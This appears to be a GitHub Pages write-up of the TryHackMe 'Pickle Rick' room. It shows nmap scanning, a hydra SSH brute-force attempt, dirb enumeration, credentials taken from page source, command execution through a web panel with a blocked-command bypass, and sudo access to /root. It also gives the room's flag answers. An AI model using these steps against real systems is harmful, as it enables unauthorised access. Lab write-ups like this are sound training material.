@@ -1,0 +1,309 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TryHackMe Pickle Rick | frncscrlnd’s writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="TryHackMe Pickle Rick" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Walkthrough/Writeup of a TryHackMe room about directory enumeration, web shells and privilege escalation" />
+<meta property="og:description" content="Walkthrough/Writeup of a TryHackMe room about directory enumeration, web shells and privilege escalation" />
+<link rel="canonical" href="http://localhost:4000/tryhackme/Pickle-RIck/" />
+<meta property="og:url" content="http://localhost:4000/tryhackme/Pickle-RIck/" />
+<meta property="og:site_name" content="frncscrlnd’s writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TryHackMe Pickle Rick" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Walkthrough/Writeup of a TryHackMe room about directory enumeration, web shells and privilege escalation","headline":"TryHackMe Pickle Rick","url":"http://localhost:4000/tryhackme/Pickle-RIck/"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=150d28b77225a4a207f11ff76d8d5a1e96152911">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          displayMath: [['$$', '$$'], ['\\[', '\\]']]
+        },
+        svg: { fontCache: 'global' }
+      };
+    </script>
+    <script id="MathJax-script" async
+            src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+    </script>
+  </head>
+  <body>
+    <div class="wrapper">
+      <section>
+        <div id="title">
+          <h1>frncscrlnd's writeups</h1>
+          <p>Writeups from challenges and CTFs i take part in.</p>
+          <hr>
+          <span class="credits left">Project maintained by <a href="https://github.com/frncscrlnd">frncscrlnd</a></span>
+          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/mattgraham">mattgraham</a></span>
+        </div>
+
+        <h1 id="pickle-rick"><a href="https://tryhackme.com/room/picklerick">Pickle Rick</a><!-- omit in toc --></h1>
+
+<p>This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.</p>
+
+<h3 id="table-of-contents">Table of contents:</h3>
+<ul>
+  <li><a href="#what-is-the-first-ingredient-that-rick-needs">What is the first ingredient that Rick needs?</a></li>
+  <li><a href="#what-is-the-second-ingredient-in-ricks-potion">What is the second ingredient in Rick’s potion?</a></li>
+  <li><a href="#what-is-the-last-and-final-ingredient">What is the last and final ingredient?</a></li>
+</ul>
+
+<h2 id="what-is-the-first-ingredient-that-rick-needs">What is the first ingredient that Rick needs?</h2>
+
+<p>We are given a web application’s IP address, which from now on will be called <code class="language-plaintext highlighter-rouge">[target_IP]</code>. Since we know it’s a web application, we expect this address to be reachable through a browser. Let’s first check which services are running on this host using <a href="nmap.org">nmap</a>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">nmap [target_IP]</code></p>
+
+<p>This will return</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<p>This means that ssh is potentially vulnerable to a <a href="https://attack.mitre.org/techniques/T1110/001/">password-guessing attack</a>. But we first need to get a username.</p>
+
+<p>Open up <code class="language-plaintext highlighter-rouge">[target_IP]</code> in a browser. You’ll be welcomed by this page:</p>
+
+<p><img src="/assets/images/thm/pr/home.png" alt="homepage" /></p>
+
+<p>Navigating through the html code, you’ll stumble upon this comment:</p>
+
+<p><img src="/assets/images/thm/pr/homecomment.png" alt="homecomment" /></p>
+
+<p>Since <code class="language-plaintext highlighter-rouge">R1ckRul3s</code> could well be an SSH username, we might as well try and use <a href="https://www.kali.org/tools/hydra/">hydra</a>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt [target_IP] ssh</code></p>
+
+<p>This will return</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ERROR] target ssh://[target_IP]:22/ does not support password authentication (method reply 4)
+</code></pre></div></div>
+
+<p>Meaning that this is not the right way.</p>
+
+<p>Since the web application’s homepage provides no additional information, let’s esplore more of the app by enumerating its’ directories by using <a href="https://www.kali.org/tools/dirb/">dirb</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dirb http://[target_IP] /usr/share/wordlists/dirb/common.txt -X .php,.txt,.html,.js
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">-X</code> flag means extensions. All words in the wordlist will be followed by these extensions.</p>
+
+<p>This will return</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+ http://[target_IP]/denied.php (CODE:302|SIZE:0)                                                                                                                    
++ http://[target_IP]/index.html (CODE:200|SIZE:1062)                                                                                                                 
++ http://[target_IP]/login.php (CODE:200|SIZE:882)                                                                                                                   
++ http://[target_IP]/portal.php (CODE:302|SIZE:0)                                                                                                                    
++ http://[target_IP]/robots.txt (CODE:200|SIZE:17)     
+</code></pre></div></div>
+
+<p>We now have a new page to investigate: <code class="language-plaintext highlighter-rouge">login.php</code> (<code class="language-plaintext highlighter-rouge">portal.php</code> redirects you to this page too).</p>
+
+<p><img src="/assets/images/thm/pr/login.png" alt="login" /></p>
+
+<p>We now have a use for our <code class="language-plaintext highlighter-rouge">R1ckRul3s</code> username. Let’s see if we can find the password with what we’ve got:</p>
+
+<p>opening up <code class="language-plaintext highlighter-rouge">http://[target_IP]/robots.txt</code> in a browser reveals a weird text:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Wubbalubbadubdub</code></p>
+
+<p>which could well be our password. Let’s try logging in to <code class="language-plaintext highlighter-rouge">http://[target_IP]/login.php</code>:</p>
+
+<p><img src="/assets/images/thm/pr/portal.png" alt="Rick Portal" /></p>
+
+<p>We now need to find the first ingredient. If Command panel is really what it’s name suggests, let’s try enumerating files on this machine:</p>
+
+<p><code class="language-plaintext highlighter-rouge">ls</code></p>
+
+<p>This will return these files:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt
+</code></pre></div></div>
+
+<p>Let’s try and read the content of <code class="language-plaintext highlighter-rouge">Sup3rS3cretPickl3Ingred.txt</code>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">cat Sup3rS3cretPickl3Ingred.txt</code></p>
+
+<p>This will return, however, an image:</p>
+
+<p><img src="/assets/images/thm/pr/disabled.png" alt="disabled command" /></p>
+
+<p>This probably means that the cat command is disabled. But don’t lose hope: we can use plenty of commands to read this .txt file:</p>
+
+<p><code class="language-plaintext highlighter-rouge">tac Sup3rS3cretPickl3Ingred.txt</code></p>
+
+<p>This will return:</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">mr. meeseek hair</code></p>
+</blockquote>
+
+<p>Which is the first ingredient.</p>
+
+<h2 id="what-is-the-second-ingredient-in-ricks-potion">What is the second ingredient in Rick’s potion?</h2>
+
+<p><code class="language-plaintext highlighter-rouge">ls</code> tells us ther’also a <code class="language-plaintext highlighter-rouge">clue.txt</code> file. Opening it with <code class="language-plaintext highlighter-rouge">tac clue.txt</code> reveals an hint:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Look around the file system for the other ingredient.</code></p>
+
+<p>let’s look at the root directory with <code class="language-plaintext highlighter-rouge">ls /</code>.</p>
+
+<p>This will return:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+</code></pre></div></div>
+
+<p>Let’s find out which users there are: <code class="language-plaintext highlighter-rouge">ls /home</code> shows the <code class="language-plaintext highlighter-rouge">rick</code> user. Let’s dive into it: <code class="language-plaintext highlighter-rouge">ls /home/rick</code>.</p>
+
+<p>This will return:</p>
+
+<p><code class="language-plaintext highlighter-rouge">second ingredients</code></p>
+
+<p>We can read the content of this file with <code class="language-plaintext highlighter-rouge">tac "second ingredients"</code>. Make sure to put double wuotes around the file name since it has whitespaces inside.</p>
+
+<p>This will return:</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">1 jerry tear</code></p>
+</blockquote>
+
+<p>Which is the second ingredient.</p>
+
+<h2 id="what-is-the-last-and-final-ingredient">What is the last and final ingredient?</h2>
+
+<p>Knowing how things work in thm rooms, this is going to be the “root flag”.</p>
+
+<p>Executing <code class="language-plaintext highlighter-rouge">ls /</code> will ,in fact, reveal a <code class="language-plaintext highlighter-rouge">root</code> directory. Let’s list it’s content with <code class="language-plaintext highlighter-rouge">ls /root</code>. This will hoever, return nothing. Executing <code class="language-plaintext highlighter-rouge">ls / -l</code> will return this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>total 104
+drwxr-xr-x   2 root root 12288 Jul 11  2024 bin
+drwxr-xr-x   3 root root  4096 Jul 11  2024 boot
+drwxr-xr-x  16 root root  3240 Dec  7 16:51 dev
+drwxr-xr-x 108 root root 12288 Dec  7 16:51 etc
+drwxr-xr-x   4 root root  4096 Feb 10  2019 home
+lrwxrwxrwx   1 root root    30 Jul 11  2024 initrd.img -&gt; boot/initrd.img-5.4.0-1103-aws
+lrwxrwxrwx   1 root root    30 Jul 11  2024 initrd.img.old -&gt; boot/initrd.img-4.4.0-1128-aws
+drwxr-xr-x  25 root root  4096 Jul 11  2024 lib
+drwxr-xr-x   2 root root  4096 Jul 11  2024 lib64
+drwx------   2 root root 16384 Nov 14  2018 lost+found
+drwxr-xr-x   2 root root  4096 Jul 11  2024 media
+drwxr-xr-x   2 root root  4096 Nov 14  2018 mnt
+drwxr-xr-x   2 root root  4096 Nov 14  2018 opt
+dr-xr-xr-x 172 root root     0 Dec  7 16:51 proc
+drwx------   4 root root  4096 Jul 11  2024 root
+drwxr-xr-x  32 root root  1000 Dec  7 16:51 run
+drwxr-xr-x   2 root root 12288 Jul 11  2024 sbin
+drwxr-xr-x   8 root root  4096 Jul 11  2024 snap
+drwxr-xr-x   2 root root  4096 Nov 14  2018 srv
+dr-xr-xr-x  13 root root     0 Dec  7 16:51 sys
+drwxrwxrwt   2 root root  4096 Dec  7 16:51 tmp
+drwxr-xr-x  11 root root  4096 Jul 11  2024 usr
+drwxr-xr-x  14 root root  4096 Feb 10  2019 var
+lrwxrwxrwx   1 root root    27 Jul 11  2024 vmlinuz -&gt; boot/vmlinuz-5.4.0-1103-aws
+lrwxrwxrwx   1 root root    27 Jul 11  2024 vmlinuz.old -&gt; boot/vmlinuz-4.4.0-1128-aws
+</code></pre></div></div>
+
+<p>This means that only the root user can access the <code class="language-plaintext highlighter-rouge">root</code> directory (<code class="language-plaintext highlighter-rouge">drwx------</code>). But can we use <code class="language-plaintext highlighter-rouge">sudo</code> to become root?</p>
+
+<p>Execute <code class="language-plaintext highlighter-rouge">sudo -l</code>. This will return:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Defaults entries for www-data on ip-10-82-139-18:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ip-10-82-139-18:
+    (ALL) NOPASSWD: ALL
+</code></pre></div></div>
+
+<p>This means that we can execute all commands with <code class="language-plaintext highlighter-rouge">sudo</code>, with no password. The following step is then just using <code class="language-plaintext highlighter-rouge">sudo</code> for all that we need:</p>
+
+<p><code class="language-plaintext highlighter-rouge">sudo ls /root</code></p>
+
+<p>This will return:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3rd.txt
+snap
+</code></pre></div></div>
+
+<p>Let’s use sudo <code class="language-plaintext highlighter-rouge">tac /root/3rd.txt</code> to red the 3rd and final ingredient:</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">fleeb juice</code></p>
+</blockquote>
+
+
+      </section>
+
+    </div>
+  </body>
+</html>
